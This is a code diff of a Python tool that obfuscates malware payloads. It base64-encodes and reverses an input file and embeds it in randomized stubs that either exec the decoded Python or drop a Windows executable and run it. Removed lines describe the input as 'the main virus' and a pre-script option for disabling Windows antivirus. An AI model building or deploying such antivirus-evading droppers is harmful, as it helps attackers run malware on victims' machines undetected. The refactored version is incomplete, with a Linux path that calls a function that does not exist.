@@ -7,214 +7,166 @@ import sys
 import random
 import string
 
+t = blessed.Terminal()
+
 logo = """
-██████      █████     █ ██████
-█     █  ██          █        █
-       █               █          █
-█      █  ██      █          █
-█      █   ██         █          █
-█      █  █          █          █
+██████      █████     █ ██████             ██████
+█     █  ██          █        █                 ██
+       █               █          █            ██
+█      █  ██      █          █                ██
+█      █   ██         █          █         ███            
+█      █  █          █          █          █████████ 
 █     █    ██        █        █
 ██ ███      █████     █ ██ ███ 
 """
-def info(msg):
-    print(f"{ter.green}⚡{msg}⚡")
-def error(msg):
-    print(f"{ter.red}ERROR:{msg}{ter.normal}")
-    sys.exit(1)
-def file_check(file):
-    if os.path.isfile(args.obfuscate):
-        info("File found")
-        not_obfuscated = open(args.obfuscate, 'rb').read()
-        info("File prepared for processing")
-        return not_obfuscated
-    else:
-        error(f"ERROR:File {args.obfuscate} Doesn't exist")
+
+class message:
+    def error(msg):
+        print(f"{t.red}❌{msg}❌{t.normal}")
+    def success(msg):
+        print(f"{t.green}⚡{msg}⚡{t.normal}")
+
+class templates:
+    class python:
+        class universal:
+            templates = ["""
+import base64 RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+import os RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+RANDOM_VAR0_NAME_HERE = base64.b64decode("ENCODED_PAYLOAD_HERE"[::-1]) RANDOM_NEWLINES
+exec(RANDOM_VAR0_NAME_HERE) RANDOM_NEWLINES
+            """, """
+import os RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+import base64 RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+exec(base64.b64decode("ENCODED_PAYLOAD_HERE"[::-1])) RANDOM_NEWLINES
+            """] 
+    class binary:
+        class windows:
+            templates = ["""
+import os RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+import base64 RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+open("RANDOM_VAR0_NAME_HERE.exe", "wb").write(base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1])) RANDOM_NEWLINES
+print(os.popen("RANDOM_VAR0_NAME_HERE.exe").read()) RANDOM_NEWLINES
+            """,
+            """
+import os RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+import base64 RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+RANDOM_VAR2_NAME_HERE = base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]) RANDOM_NEWLINES
+open("RANDOM_VAR0_NAME_HERE.exe", "wb").write(RANDOM_VAR2_NAME_HERE) RANDOM_NEWLINES
+os.popen("RANDOM_VAR0_NAME_HERE.exe") RANDOM_NEWLINES
+            """,
+            """
+import os RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+import base64 RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+RANDOM_VAR2_NAME_HERE = base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]) RANDOM_NEWLINES
+open("RANDOM_VAR0_NAME_HERE.exe", "wb").write(RANDOM_VAR2_NAME_HERE) RANDOM_NEWLINES
+os.system("RANDOM_VAR0_NAME_HERE.exe") RANDOM_NEWLINES
+            """,
+            """
+import os RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+import base64 RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+open("RANDOM_VAR0_NAME_HERE.exe", "wb").write(base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1])) RANDOM_NEWLINES
+os.system("RANDOM_VAR0_NAME_HERE.exe") RANDOM_NEWLINES
+            """]
+
+
+def arg_check(args):
+    if args.os not in ['windows', 'linux']:
+        message.error('Invalid OS')
         sys.exit(1)
+    if os.path.exists(args.output_file):
+        message.error('Output file already exists')
+        sys.exit(1)
+    if args.format not in ['python', 'binary', 'bash']:
+        message.error('Invalid file format')
+        sys.exit(1)
+    if not os.path.isfile(args.input_file):
+        message.error('Input file does not exist')
+        sys.exit(1)
+    message.success("Arguments passed the checks")
+
+class obfuscate:
+    def payload_encode():
+        payload = open(args.input_file, 'rb').read()
+        encoded_payload = base64.b64encode(payload).decode()[::-1]
+        message.success("Payload encoded")
+        return encoded_payload
+
+    def random_var():
+        variable_name = ""
+        charset = list("abcdefghijklmnopqrstuvwxyz1234567890")
+        length = random.randint(5,15)
+        for cur in range(length):
+            character = random.choice(charset)
+            if character not in list("1234567890"):
+                case = [character, character.upper()]
+                character = random.choice(case)
+            variable_name += character
+        return variable_name
+
+    def random_imports():
+        imports = ""
+        list_of_imports = """
+import string
+import socket
+import subprocess
+import math
+import random""".split("\n")
+        for i in range(random.randint(0,5)):
+            imports += random.choice(list_of_imports) + '\n'
+        message.success("Random imports added")
+        return imports 
 
 
-def randomize():
-    return f"{random.choice(list(string.ascii_lowercase)) * random.randint(1,10)}{random.randint(1,99999) +1}",random.choice(['"', "'", '"""'])
+    def template_configure(template):
+            for i in range(99999):
+                if f"RANDOM_VAR{i}_NAME_HERE" in template:
+                    template = template.replace(f"RANDOM_VAR{i}_NAME_HERE", obfuscate.random_var())
+                else:
+                    break
+            template = template.replace("RANDOM_NEWLINES", '\n' * random.randint(0,3))
+            template = template.replace("ENCODED_PAYLOAD_HERE", obfuscate.payload_encode())
+            template = template.replace("RANDOM_IMPORTS", obfuscate.random_imports())
+            message.success("Template configured")
+            return template
 
-class main:
+    def windows():
+        if args.format == "python":
+            message.success("Using python templates")
+            template = random.choice(templates.python.universal.templates)
+            template = obfuscate.template_configure(template)
 
-   
-   def bash(args):
-    not_obfuscated = file_check(args.obfuscate)
-    info("Generating obfuscated code")
-    
-    obfuscated = base64.b64encode(not_obfuscated)
-    var1,close = randomize()
-    new_line = "\n"
-
-    if args.pre_script:
-        if os.path.isfile(args.pre_script):
-
-            pre_script = open(args.pre_script, 'rb').read()
-            pre_script = base64.b64encode(pre_script)
-            var2 = f"{random.choice(list(string.ascii_lowercase)) * random.randint(1,10)}{random.randint(1,99999) +1}" 
-
-            obfuscated_code = f"""import base64 {new_line * random.randint(0,2)}
-import os {new_line * random.randint(0,2)}
-{var2} = base64.b64decode({close}{pre_script.decode()[::-1]}{close}[::-1]).decode() {new_line * random.randint(0,1)}
-{var1} = base64.b64decode({close}{obfuscated.decode()[::-1]}{close}[::-1]).decode() {new_line * random.randint(0,1)}
-exec({var2}) {new_line * random.randint(0,1)}
-{random.choice(['os.system(', 'os.popen('])}{var1}) {new_line * random.randint(0,2)}"""
-
-
-        else:
-            print(f"{ter.red}ERROR:File {args.pre_script} Doesn't exist{ter.normal}")
-            sys.exit(1)
-
-
-    else:
-          obfuscated_code = f"""import base64 {new_line * random.randint(0,2)}
-import os {new_line * random.randint(0,2)}
-{var1} = base64.b64decode({close}{obfuscated.decode()[::-1]}{close}[::-1]).decode() {new_line * random.randint(0,1)}
-{random.choice(['os.system(', 'os.popen('])}{var1}) {new_line * random.randint(0,2)}"""
-
-
-
-    info("Code obfuscated")
-
-    with open(args.out, "w") as output:
-        output.write(obfuscated_code)
-
-    print(f"{ter.green}⚑Obfuscated code written to: {args.out}⚑{ter.normal}")
-
-
-
-
-
-
-
-
-   def binary(args):
-    not_obfuscated = file_check(args.obfuscate)
-    info("Generating obfuscated code")
-    obfuscated = base64.b64encode(not_obfuscated)
-    var1,close = randomize()
-    new_line = "\n"
-    if not args.os:
-        error("You need to define operating system when using binary format (windows,linux)")
-    if args.os.lower() == "windows":
-        name = 'dump.exe'
-        access = ""
-        execution = name.split('.')[0]
-    elif args.os.lower() == "linux":
-        name = 'dump'
-        access = random.choice([f'chmod 777 {name} && ', f'chmod +x {name} && '])
-        execution = f'./{name}'
-    else:
-        error(f"Invalid OS:{args.os} Supported OSes:windows, linux")
-
-    if args.pre_script:
-        if os.path.isfile(args.pre_script):
-
-            pre_script = open(args.pre_script, 'rb').read()
-            pre_script = base64.b64encode(pre_script)
-            var2 = f"{random.choice(list(string.ascii_lowercase)) * random.randint(1,10)}{random.randint(1,99999) +1}" 
-
-            obfuscated_code = f"""import base64 {new_line * random.randint(0,2)}
-import os {new_line * random.randint(0,2)}
-{var2} = base64.b64decode({close}{pre_script.decode()[::-1]}{close}[::-1]).decode() {new_line * random.randint(0,1)}
-{var1} = base64.b64decode({close}{obfuscated.decode()[::-1]}{close}[::-1]) {new_line * random.randint(0,1)}
-exec({var2}) {new_line * random.randint(0,1)}
-open('{name}', 'wb').write({var1}) {new_line * random.randint(0,2)}
-{random.choice(['os.system("', 'os.popen("'])}{access}{execution}"){new_line * random.randint(0,1)}"""
-
-
-        else:
-            print(f"{ter.red}ERROR:File {args.pre_script} Doesn't exist{ter.normal}")
-            sys.exit(1)
-
-
-    else:
-          obfuscated_code = f"""import base64 {new_line * random.randint(0,2)}
-import os {new_line * random.randint(0,2)}
-{var1} = base64.b64decode({close}{obfuscated.decode()[::-1]}{close}[::-1]) {new_line * random.randint(0,1)}
-open('{name}', 'wb').write({var1})  {new_line * random.randint(0,2)}
-{random.choice(['os.system("', 'os.popen("'])}{access}{execution}"){new_line * random.randint(0,1)}"""
-
-    info("Code obfuscated")
-
-    with open(args.out, "w") as output:
-        output.write(obfuscated_code)
-
-    print(f"{ter.green}⚑Obfuscated code written to: {args.out}⚑{ter.normal}")
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-   def python(args):
-    not_obfuscated = file_check(args.obfuscate)
-    info("Generating obfuscated code")
-    
-    obfuscated = base64.b64encode(not_obfuscated)
-    var1,close = randomize()
-    new_line = "\n"
-
-    if args.pre_script:
-        if os.path.isfile(args.pre_script):
-
-            pre_script = open(args.pre_script, 'rb').read()
-            pre_script = base64.b64encode(pre_script)
-            var2 = f"{random.choice(list(string.ascii_lowercase)) * random.randint(1,10)}{random.randint(1,99999) +1}" 
-
-            obfuscated_code = f"""import base64 {new_line * random.randint(0,2)}
-{var2} = base64.b64decode({close}{pre_script.decode()[::-1]}{close}[::-1]).decode() {new_line * random.randint(0,1)}
-{var1} = base64.b64decode({close}{obfuscated.decode()[::-1]}{close}[::-1]).decode() {new_line * random.randint(0,1)}
-exec({var2}) {new_line * random.randint(0,1)}
-exec({var1}) {new_line * random.randint(0,2)}"""
-
-
-        else:
-            print(f"{ter.red}ERROR:File {args.pre_script} Doesn't exist{ter.normal}")
-            sys.exit(1)
-
-
-    else:
-          obfuscated_code = f"""import base64 {new_line * random.randint(0,2)}
-{var1} = base64.b64decode({close}{obfuscated.decode()[::-1]}{close}[::-1]).decode() {new_line * random.randint(0,1)}
-exec({var1}) {new_line * random.randint(0,2)}"""
-
-
-
-    info("Code obfuscated")
-
-    with open(args.out, "w") as output:
-        output.write(obfuscated_code)
-
-    print(f"{ter.green}⚑Obfuscated code written to: {args.out}⚑{ter.normal}")
-
+        if args.format == "binary":
+            message.success("Using binary templates")
+            if args.os == "windows":
+                template = random.choice(templates.binary.windows.templates)
+                template = obfuscate.template_configure(template)
+        open(args.output_file, "w").write(template)
+        print(f"{t.blue}🏁----CODE-OBFUSCATED-SUCCESSFULLY----🏁")
+def main(args):
+    if args.os == "windows":
+        obfuscate.windows()
+    elif args.os == "linux":
+        obfuscate.linux()
 
 if __name__ == "__main__":
-    ter = blessed.Terminal()
-    globals()['ter'] = ter
-    print(ter.green + logo + ter.normal)
+    print(f"{t.green}{logo}{t.normal}")
     parser = argparse.ArgumentParser()
-    parser.add_argument("-o", '--obfuscate', help='File to obfuscate.', required=True)
-    parser.add_argument("-p", '--pre-script', help='Python script to run before executing the main virus (to for example disable windows av).', required=False)
-    parser.add_argument("-f", '--format', help='What format is the target file (binary,python,bash)', required=True)
-    parser.add_argument("--os", help='Target operating system.', required=False)
-    parser.add_argument("--out", help='Output obfuscated code to.', required=True)
+    parser.add_argument('-i', '--input-file', help="File you want to obfuscate.", required=True)
+    parser.add_argument('-f', '--format', help="What format the file is you want to obfuscate. (python, binary, bash) (only binary and python works currently)", required=True)
+    parser.add_argument('-o', '--output-file', help="File where you want the obfuscated while to be written.", required=True)
+    parser.add_argument('--os', help="Operating system the obfuscated code will be ran in. (windows,linux) (only windows works currently)", required=True)
     args = parser.parse_args()
-    if args.format.lower() == 'python':
-       main.python(args)
-    elif args.format.lower() == 'binary':
-       main.binary(args)
-    elif args.format.lower() == 'bash':
-        main.bash(args)
-    else:
-       error(f"Invalid format {args.format.lower()}, valid formats are:binary,python")
+    arg_check(args)
+    main(args)
